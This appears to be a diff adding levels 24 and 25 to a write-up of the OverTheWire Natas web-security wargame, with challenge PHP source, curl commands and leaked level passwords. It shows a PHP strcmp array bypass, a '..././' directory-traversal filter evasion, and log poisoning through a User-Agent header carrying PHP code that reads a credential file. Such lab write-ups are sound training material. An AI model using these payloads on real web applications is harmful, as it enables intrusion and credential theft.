@@ -107,6 +107,90 @@ $ curl -u natas23:D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE http://natas23.natas.labs.ove
 
 ```
 The credentials for the next level are:
-Username: natas24
-Password: OsRmXFguozKpTZZ5X14zNO43379LZveg
+Username: natas24 Password: OsRmXFguozKpTZZ5X14zNO43379LZveg
+```
+
+## level 24
+
+```php
+<?php
+// http://natas24.natas.labs.overthewire.org/index-source.html
+if(array_key_exists("passwd",$_REQUEST)){
+    if(!strcmp($_REQUEST["passwd"],"<censored>")){
+        echo "<br>The credentials for the next level are:<br>";
+        echo "<pre>Username: natas25 Password: <censored></pre>";
+    }
+    else{
+        echo "<br>Wrong!<br>";
+    }
+}
+?>
+```
+
+Read the [PHP manual](http://php.net/manual/en/function.strcmp.php#102677). ```strcmp('pending',array())``` will return ```-1``` in PHP 5.2.16 (probably in all versions prior 5.3), but will return ```0``` in PHP 5.3.3.
+If we pass the ```passwd``` value as an array, it's all solved.
+
+```
+$ curl -u natas24:OsRmXFguozKpTZZ5X14zNO43379LZveg http://natas24.natas.labs.overthewire.org/ -F 'passwd[]=ving'
+```
+
+```
+The credentials for the next level are:
+Username: natas25 Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c
+```
+
+## level 25
+
+```php
+<?php
+// http://natas25.natas.labs.overthewire.org/index-source.html
+function safeinclude($filename){
+    // check for directory traversal
+    if(strstr($filename,"../")){
+        logRequest("Directory traversal attempt! fixing request.");
+        $filename=str_replace("../","",$filename);
+    }
+    // dont let ppl steal our passwords
+    if(strstr($filename,"natas_webpass")){
+        logRequest("Illegal file access detected! Aborting!");
+        exit(-1);
+    }
+    // add more checks...
+
+    if (file_exists($filename)){
+        include($filename);
+        return 1;
+    }
+    return 0;
+}
+?>
+```
+
+```../``` will be replaced by space to prevent directory traversal attempt and the path can not contain ```natas_webpass```, So we can not get the password directly.
+
+But we can use the path below to read the log file. After replacement, ```..././..././..././..././..././tmp/natas25_<PHPSESSID>.log``` becomes ```../../../../../tmp/natas25_<PHPSESSID>.log```.
+
+```php
+<?php
+function logRequest($message){
+    $log="[". date("d.m.Y H::i:s",time()) ."]";
+    $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
+    $log=$log . " \"" . $message ."\"\n";
+    $fd=fopen("/tmp/natas25_" . session_id() .".log","a");
+    fwrite($fd,$log);
+    fclose($fd);
+}
+?>
+```
+
+Now we want to write the password in the log file. The log records ```HTTP_USER_AGENT```, So we can inject some codes in it.
+
+```
+$ curl -u natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c http://natas25.natas.labs.overthewire.org/ -b 'PHPSESSID=v1347323qckbp3kbcj4f13tmq2' -H 'User-Agent: <?php echo file_get_contents("/etc/natas_webpass/natas26") ?>' -F 'lang=..././..././..././..././..././tmp/natas25_v1347323qckbp3kbcj4f13tmq2.log'
+```
+
+Then read the log file again.
+
+```
+[11.08.2016 07::47:57] oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T "Directory traversal attempt! fixing request."
 ```
